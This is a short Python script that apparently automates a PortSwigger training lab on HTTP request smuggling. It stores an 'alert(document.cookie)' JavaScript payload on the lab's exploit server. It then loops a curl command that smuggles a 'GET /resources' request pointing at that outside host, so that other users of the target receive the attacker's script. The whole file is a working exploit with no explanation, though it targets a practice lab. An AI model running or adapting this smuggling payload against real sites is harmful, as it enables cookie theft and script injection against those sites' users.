import re
import os
import sys
import requests

print("Wait 30-120sek")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]


session = requests.Session()


response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

burp_data = {"urlIsHttps": "on", "responseFile": "/resources", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8", "responseBody": "alert(document.cookie)", "formAction": "STORE"}
requests.post(exploit_server, data=burp_data)

for _ in range(180):
    os.system(f"curl -q -X 'POST' -H 'Host: {burp_url[8:]}' -H 'Content-Length: 0' --data-binary $'GET /resources HTTP/1.1\x0d\x0aHost: {exploit_server[8:]}\x0d\x0aContent-Length: 5\x0d\x0a\x0d\x0ax=1'  {burp_url} > /dev/null 2>&1")
